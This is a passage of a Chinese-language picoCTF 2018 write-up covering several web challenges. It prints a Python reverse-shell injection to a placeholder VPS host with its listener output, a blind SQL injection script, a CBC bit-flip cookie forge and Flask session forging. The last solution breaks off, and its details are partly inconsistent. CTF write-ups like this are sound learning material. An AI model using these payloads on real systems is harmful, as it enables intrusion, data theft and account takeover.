<div class="highlight"><pre><span></span><span class="nv">ip</span><span class="o">=</span><span class="m">0</span>.0.0.0<span class="p">;</span>python -c <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_vps_ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</pre></div>
<p>在vps上开启nc监听。</p>
<div class="highlight"><pre><span></span>~ nc -lvvp <span class="m">8888</span>
Listening on <span class="o">[</span><span class="m">0</span>.0.0.0<span class="o">]</span> <span class="o">(</span>family <span class="m">0</span>, port <span class="m">8888</span><span class="o">)</span>
Connection from <span class="o">[</span><span class="m">18</span>.224.157.204<span class="o">]</span> port <span class="m">8888</span> <span class="o">[</span>tcp/*<span class="o">]</span> accepted <span class="o">(</span>family <span class="m">2</span>, sport <span class="m">42170</span><span class="o">)</span>
/bin/dash: <span class="m">0</span>: can<span class="err">'</span>t access tty<span class="p">;</span> job control turned off
$ ls
index.php
index.txt
the-secret-1335-flag.txt
xinet_startup.sh
$ cat the-secret-1335-flag.txt
Here is your flag: picoCTF<span class="o">{</span>n3v3r_trust_a_b0x_d7ad162d<span class="o">}</span>
</pre></div>
<p>flag:<code>picoCTF{n3v3r_trust_a_b0x_d7ad162d}</code></p>
<h1 data-content="1" id="bf35208d11e0a93deb95fb627d4ebc37">Help Me Reset 2</h1>
<h2 data-content="1" id="38badc9037c9552e29324a1630b06a92">Question</h2>
<blockquote>
<p>There is a website running at <a href="http://2018shell1.picoctf.com:19054/" target="_blank">http://2018shell1.picoctf.com:19054</a> (<a href="http://2018shell1.picoctf.com:19054/" target="_blank">link</a>). We need to get into any user for a flag!</p>
</blockquote>
<h3 data-content="1" id="5d6a8fb51a9f20c656c76ce546bfaef6">Hint</h3>
<blockquote>
<p>Try looking past the typical vulnerabilities. Think about possible programming mistakes.</p>
</blockquote>
<h2 data-content="1" id="b4b67b061f7ef56cf8493170892f3d3c">Solution</h2>
<p>查看源码，发现有一处注释。</p>
<div class="highlight"><pre><span></span><span class="c">&lt;!--Proudly maintained by zambrano--&gt;</span>
</pre></div>
<p>然后跳到登录页面，只有登录和找回密码功能。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017180008-6e025f94-d1f3-1.png"/></p>
<p>点击忘记密码。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017180022-7621bc1a-d1f3-1.png"/></p>
<p>这里应该用到的就是源码里出现的用户名，输入并点击重置密码。有密保问题。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017180035-7e3b1bda-d1f3-1.png"/></p>
<p>抓包发现一段<code>session</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017180047-84dc216e-d1f3-1.png"/></p>
<p>是flask的session，用<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank">解码工具</a>解一下试试。</p>
<div class="highlight"><pre><span></span>flask-session-cookie-manager git/master
❯ python session_cookie_manager.py decode -c <span class="s2">".eJw9jd0OgjAMRl_F9HoX-JNFeRUlpECBxW01XQlRwru7XejVab-059ugX0QoKtQwMg9g4MUpuc4T1PdfNJNwRs-epRAl4JOgMSBumrXteSmGysCSSNoBFaHe4KDF8cHQCcYisOeLPV1vR1uBycfr7JRy3KEGjHlQfnN-NTCKo5S5Ou8dhvSI0Ox5FY7Tv23_Ar8wPVk.DqhNVw.Kz2YnbgDvhKMVlu7OgioYaSBPpU"</span>
<span class="o">{</span><span class="s2">"current"</span>:<span class="s2">"food"</span>,<span class="s2">"possible"</span>:<span class="o">[</span><span class="s2">"food"</span>,<span class="s2">"hero"</span>,<span class="s2">"color"</span>,<span class="s2">"carmake"</span><span class="o">]</span>,<span class="s2">"right_count"</span>:0,<span class="s2">"user_data"</span>:<span class="o">{</span><span class="s2">" t"</span>:<span class="o">[</span><span class="s2">"zambrano"</span>,<span class="s2">"6346289160"</span>,0,<span class="s2">"white"</span>,<span class="s2">"batman"</span>,<span class="s2">"toyota"</span>,<span class="s2">"fries"</span>,<span class="s2">"williams\n"</span><span class="o">]}</span>,<span class="s2">"wrong_count"</span>:0<span class="o">}</span>
</pre></div>
<p>答案都在这个list里面，对照类型回答问题，回答三次后可以重置密码，重置后使用自己的密码登录，得到flag。</p>
<p>flag:<code>picoCTF{i_thought_i_could_remember_those_cb4afc2a}</code></p>
<h1 data-content="1" id="3c8065d33fe5ceacccfb6d6ca052fa6a">A Simple Question</h1>
<h2 data-content="1" id="e13aabfbb076aadcd5715091b680ca5a">Question</h2>
<blockquote>
<p>There is a website running at <a href="http://2018shell1.picoctf.com:2644/" target="_blank">http://2018shell1.picoctf.com:2644</a> (<a href="http://2018shell1.picoctf.com:2644/" target="_blank">link</a>). Try to see if you can answer its question.</p>
</blockquote>
<h3 data-content="1" id="a6a4838774b24b65f7be0a1c302a4c97">Hint</h3>
<p>No Hints.</p>
<h2 data-content="1" id="8177f6300df1815640324965495773a0">Solution</h2>
<p>注释里给出了源码</p>
<div class="highlight"><pre><span></span><span class="c">&lt;!-- source code is in answer2.phps --&gt;</span>
</pre></div>
<p><code>asnwer2.php</code></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
  <span class="k">include</span> <span class="s2">"config.php"</span><span class="p">;</span>
  <span class="nb">ini_set</span><span class="p">(</span><span class="s1">'error_reporting'</span><span class="p">,</span> <span class="k">E_ALL</span><span class="p">);</span>
  <span class="nb">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="s1">'On'</span><span class="p">);</span>

  <span class="nv">$answer</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"answer"</span><span class="p">];</span>
  <span class="nv">$debug</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">];</span>
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM answers WHERE answer='</span><span class="si">$answer</span><span class="s2">'"</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">"SQL query: "</span><span class="p">,</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$query</span><span class="p">),</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="cp">&lt;?php</span>
  <span class="nv">$con</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="nv">$database_file</span><span class="p">);</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$con</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>

  <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">();</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$answer</span> <span class="o">==</span> <span class="nv">$CANARY</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;h1&gt;Perfect!&lt;/h1&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"&lt;p&gt;Your flag is: </span><span class="si">$FLAG</span><span class="s2">&lt;/p&gt;"</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;h1&gt;You are so close.&lt;/h1&gt;"</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;h1&gt;Wrong.&lt;/h1&gt;"</span><span class="p">;</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>简单的sql盲注，没有任何过滤，写脚本跑或者用sqlmap跑都可以，但是要注意的是，如果用<code>like</code>注入的话是不区分大小写的，可以用区分大小写的<code>GLOB</code>。</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>


<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_letters</span><span class="p">,</span> <span class="n">digits</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s1">''</span>
<span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">"http://2018shell2.picoctf.com:2644/answer2.php"</span>
<span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"User-Agent"</span><span class="p">:</span> <span class="s2">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0"</span><span class="p">,</span> <span class="s2">"Accept"</span><span class="p">:</span> <span class="s2">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="p">,</span> <span class="s2">"Accept-Language"</span><span class="p">:</span> <span class="s2">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
                 <span class="s2">"Accept-Encoding"</span><span class="p">:</span> <span class="s2">"gzip, deflate"</span><span class="p">,</span> <span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"application/x-www-form-urlencoded"</span><span class="p">,</span> <span class="s2">"Connection"</span><span class="p">:</span> <span class="s2">"close"</span><span class="p">,</span> <span class="s2">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s2">"1"</span><span class="p">,</span> <span class="s2">"Pragma"</span><span class="p">:</span> <span class="s2">"no-cache"</span><span class="p">,</span> <span class="s2">"Cache-Control"</span><span class="p">:</span> <span class="s2">"no-cache"</span><span class="p">}</span>
<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">digits</span><span class="o">+</span><span class="n">ascii_letters</span><span class="p">:</span>
        <span class="n">cnt</span> <span class="o">=</span> <span class="n">j</span>
        <span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">"answer"</span><span class="p">:</span> <span class="s2">"1' or hex(substr((select answer from answers limit 1 offset 0),{},1))=hex('{}') -- "</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
            <span class="c1"># "answer":"1' or (select answer from answers where answer like '{}%') -- ".format(flag+i)</span>
        <span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
        <span class="k">if</span> <span class="s1">'You'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span>
            <span class="k">print</span> <span class="n">flag</span>
            <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="n">j</span><span class="p">:</span>
        <span class="k">break</span>
<span class="k">print</span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></div>
<p>得到answer:<code>41AndSixSixths</code>，post过去得到flag。</p>
<p>flag:<code>picoCTF{qu3stions_ar3_h4rd_28fc1206}</code></p>
<h1 data-content="1" id="9f722f3d7f04c6d901fd2735c05259dc">Secure Logon</h1>
<h2 data-content="1" id="a76938d6d2e0a4213886af04ea59fe3d">Question</h2>
<blockquote>
<p>Uh oh, the login page is more secure... I think. <a href="http://2018shell1.picoctf.com:12004/" target="_blank">http://2018shell1.picoctf.com:12004</a> (<a href="http://2018shell1.picoctf.com:12004/" target="_blank">link</a>). <a href="https://github.com/PlatyPew/picoctf-2018-writeup/blob/master/Web%20Exploitation/Secure%20Logon/files/server_noflag.py" target="_blank">Source</a>.</p>
</blockquote>
<h3 data-content="1" id="a056b7c0517444dc40a6dc0d4fe6d655">Hint</h3>
<blockquote>
<p>There are versions of AES that really aren't secure.</p>
</blockquote>
<h2 data-content="1" id="1a00001cb9e7ce4d21f6c77b62acf6f5">Solution</h2>
<p>查看题目提供的源码</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="nn">Crypto</span> <span class="kn">import</span> <span class="n">Random</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">'seed removed'</span>
<span class="n">flag_value</span> <span class="o">=</span> <span class="s1">'flag removed'</span>

<span class="n">BLOCK_SIZE</span> <span class="o">=</span> <span class="mi">16</span>  <span class="c1"># Bytes</span>
<span class="n">pad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="n">BLOCK_SIZE</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BLOCK_SIZE</span><span class="p">)</span> <span class="o">*</span> \
                <span class="nb">chr</span><span class="p">(</span><span class="n">BLOCK_SIZE</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BLOCK_SIZE</span><span class="p">)</span>
<span class="n">unpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:])]</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="n">message</span> <span class="o">=</span> <span class="s2">"I'm sorry the admin password is super secure. You're not getting in that way."</span>
        <span class="n">category</span> <span class="o">=</span> <span class="s1">'danger'</span>
        <span class="n">flash</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">category</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">"/flag"</span><span class="p">))</span>

    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">cookie</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span>
    <span class="n">cookie</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span>
    <span class="n">cookie</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">print</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
    <span class="n">cookie_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">cookie_data</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
    <span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">'cookie'</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/logout'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">"/"</span><span class="p">))</span>
    <span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">'cookie'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="n">expires</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
  <span class="k">try</span><span class="p">:</span>
      <span class="n">encrypted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">'cookie'</span><span class="p">]</span>
  <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
      <span class="n">flash</span><span class="p">(</span><span class="s2">"Error: Please log-in again."</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'main'</span><span class="p">))</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

  <span class="k">try</span><span class="p">:</span>
     <span class="n">check</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span>
  <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
     <span class="n">check</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'flag.html'</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">flag_value</span><span class="p">)</span>
  <span class="n">flash</span><span class="p">(</span><span class="s2">"Success: You logged in! Not sure you'll be able to see the flag though."</span><span class="p">,</span> <span class="s2">"success"</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'not-flag.html'</span><span class="p">,</span> <span class="n">cookie</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">AESCipher</span><span class="p">:</span>
    <span class="sd">"""</span>
<span class="sd">    Usage:</span>
<span class="sd">        c = AESCipher('password').encrypt('message')</span>
<span class="sd">        m = AESCipher('password').decrypt(c)</span>
<span class="sd">    Tested under Python 3 and PyCrypto 2.6.1.</span>
<span class="sd">    """</span>

    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf8'</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw</span><span class="p">):</span>
        <span class="n">raw</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">Random</span><span class="o">.</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">enc</span><span class="p">):</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:]))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf8'</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</pre></div>
<p>cookie使用AES的CBC模式加解密</p>
<p><img src="https://raw.githubusercontent.com/StefanoWen/img/master/img/20181105223114.png"/></p>
<p>尝试使用用户名<code>admin' or 1=1#</code>登录</p>
<p><img src="https://raw.githubusercontent.com/StefanoWen/img/master/img/20181105222844.png"/></p>
<p>这里存在CBC<code>字节翻转攻击</code>，通过翻转密文块的字节，以控制明文的字节，具体可以参考<a href="https://www.cnblogs.com/s1ye/p/9021202.html" target="_blank">https://www.cnblogs.com/s1ye/p/9021202.html</a></p>
<p>fuzz一下需要翻转的cookie字节下标，发现是10，然后获取翻转后的cookie</p>
<div class="highlight"><pre><span></span><span class="n">cookie</span> <span class="o">=</span> <span class="s2">"3rnA1PIvka2g+HXQVjBOaEtMwLBlMhKEMESJEWw+sIobKcPdVrZBGAZ6GcnVSWbRKjobSdvdjyOeYAX4z6ARbe3pfMRxP1EvKNd079YBPSI="</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
    <span class="s1">'base64'</span><span class="p">)</span>
<span class="n">flip</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="mi">10</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">"0"</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">"1"</span><span class="p">)</span>
<span class="n">newCookie</span> <span class="o">=</span> <span class="p">(</span><span class="n">cookie</span><span class="p">[:</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">flip</span><span class="p">)</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">[</span><span class="mi">11</span><span class="p">:])</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)</span>
<span class="k">print</span> <span class="n">newCookie</span>
</pre></div>
<p>得到新的cookie</p>
<p><code>3rnA1PIvka2g+HTQVjBOaEtMwLBlMhKEMESJEWw+sIobKcPdVrZBGAZ6GcnVSWbRKjobSdvdjyOeYAX4z6ARbe3pfMRxP1EvKNd079YBPSI=</code></p>
<p>更新cookie得到flag</p>
<p>flag:<code>picoCTF{fl1p_4ll_th3_bit3_a6396679}</code></p>
<h1 data-content="1" id="fe6228608b7c8473e3d0b82287f8a4ab">Flaskcards Skeleton Key</h1>
<h2 data-content="1" id="04901141dce0ea40fb702173a0a6492c">Question</h2>
<blockquote>
<p>Nice! You found out they were sending the Secret_key: 385c16dd09098b011d0086f9e218a0a2. Now, can you find a way to log in as admin? <a href="http://2018shell1.picoctf.com:48263/" target="_blank">http://2018shell1.picoctf.com:48263</a> (<a href="http://2018shell1.picoctf.com:48263/" target="_blank">link</a>).</p>
</blockquote>
<h3 data-content="1" id="00773c7dc8d1dcb330c2a4218cba28bb">Hint</h3>
<blockquote>
<p>What can you do with a flask Secret_Key?</p>
<p>The database still reverts every 2 hours</p>
</blockquote>
<h2 data-content="1" id="0fced0615a26205bcba57af78729c6c3">Solution</h2>
<p>题目页面和<code>Flaskcard</code>一样，但这题要求作为admin登录，访问/admin得到一段session</p>
<p><code>.eJwlj0tqAzEQBe-itRdSt1rd8mWG_okYQwIz9irk7hak9q949VuOdeb1Ve6v8523cjyi3MvC4CmAA5QqklCOmsRDUYmGs6U1BpsNR53VyGu34FzmQgTGS4cYdeQaEI15NjAdEISunXoPJRZSTRyRhjKEoQk7L5e6Kbfi17mO188zv_efbOC-mFwmhKQDixNDInDTreW25jbh3r2vPP8jqPx9AAZePd0.DpA5UQ.ALSxhNUvHq8TDSk0gxcmee3A56E</code></p>
<p>使用解密工具<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank">https://github.com/noraj/flask-session-cookie-manager</a></p>
<div class="highlight"><pre><span></span>❯ python session_cookie_manager.py decode -c <span class="s2">".eJwlj0uqAjEQAO-StYvuJN1Je5kh_UMRFGZ09Xh3d8B9FVT9lS33OG7l-t4_cSnb3cu1MNCYJGCM0aMxIYRKyljT20LRnIgCZDSrOWJUgGqLLUGTBd2c0HRwAKpwr3zyVbKOMbOZsU4XydXRJYhW1yQnAhkarKHlUuzYc3u_HvE8e3oncRue7khzdfLGxm1Chvvw0fFMY66n9zli_00glf8vm04_Fg.DsHtkw.IpOz5sQX8GykxrRCeyrQX9DGZtk"</span> -s <span class="s2">"a155eb4e1743baef085ff6ecfed943f2"</span>
<span class="o">{</span>u<span class="s1">'csrf_token'</span>: u<span class="s1">'4459dc7dfdd158a45d36c6380fedd7d74197a662'</span>, u<span class="s1">'_fresh'</span>: True, u<span class="s1">'user_id'</span>: u<span class="s1">'15'</span>, u<span class="s1">'_id'</span>: u<span class="s1">'60578590c61e4e36510eb9f97a8d3a19bf811905c582cd11e2002ca6cf0bf691dcd51cb76e01b9642681129f2778f3cc6b8d99fa41d9e55a4bf5d55097be6beb'</span><span class="o">}</span>
</pre></div>
<p>修改user_id为1得到新session</p>
<div class="highlight"><pre><span></span>❯ python session_cookie_manager.py encode -t <span class="s2">"{u'csrf_token': u'4459dc7dfdd158a45d36c6380fedd7d74197a662', u'_fresh': True, u'user_id': u'15', u'_id': u'60578590c61e4e36510eb9f97a8d3a19bf811905c582cd11e2002ca6cf0bf691dcd51cb76e01b9642681129f2778f3cc6b8d99fa41d9e55a4bf5d55097be6beb'}"</span> -s <span class="s2">"a155eb4e1743baef085ff6ecfed943f2"</span>
